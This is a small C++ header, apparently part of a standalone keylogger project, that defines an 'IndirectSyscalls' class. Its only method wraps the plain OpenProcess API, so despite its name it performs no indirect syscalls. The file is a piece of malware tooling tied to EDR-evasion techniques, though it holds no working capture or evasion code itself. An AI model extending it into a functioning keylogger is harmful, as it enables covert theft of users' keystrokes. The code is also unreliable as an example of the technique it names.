// Indirect Syscalls - Minimal stub for standalone keylogger
// Copyright (c) 2025 - 28zaakypro@proton.me

#ifndef INDIRECTSYSCALLS_H
#define INDIRECTSYSCALLS_H

#include <windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

class IndirectSyscalls {
public:
    static NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, 
                                     PVOID ObjectAttributes, PVOID ClientId) {
        // Fallback: use OpenProcess API
        HANDLE hProcess = OpenProcess(DesiredAccess, FALSE, (DWORD)(ULONG_PTR)((PVOID*)ClientId)[0]);
        if (hProcess) {
            *ProcessHandle = hProcess;
            return 0; // STATUS_SUCCESS
        }
        return 0xC0000001; // STATUS_UNSUCCESSFUL
    }
};

#endif // INDIRECTSYSCALLS_H
